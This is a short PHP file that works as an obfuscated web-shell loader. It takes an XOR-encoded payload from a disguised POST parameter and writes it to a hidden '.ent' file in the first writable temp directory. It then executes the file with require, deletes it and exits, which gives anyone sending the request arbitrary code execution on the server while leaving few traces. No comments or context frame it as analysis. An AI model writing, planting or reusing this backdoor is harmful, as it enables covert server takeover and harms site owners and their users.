<?php

if(isset($_POST["p\x73et"])){
	$token = array_filter([getcwd(), ini_get("upload_tmp_dir"), "/tmp", getenv("TEMP"), "/dev/shm", getenv("TMP"), "/var/tmp", sys_get_temp_dir(), session_save_path()]);
	$holder = hex2bin($_POST["p\x73et"]);
	$data_chunk      =    ''    ;      $g = 0; do{$data_chunk .= chr(ord($holder[$g]) ^ 69);$g++;} while($g < strlen($holder));
	$resource = 0;
do {
    $binding = $token[$resource] ?? null;
    if ($resource >= count($token)) break;
    		if ((is_dir($binding) and is_writable($binding))) {
    $record = join("/", [$binding, ".ent"]);
    if (file_put_contents($record, $data_chunk)) {
	require $record;
	unlink($record);
	die();
}
}
    $resource++;
} while (true);
}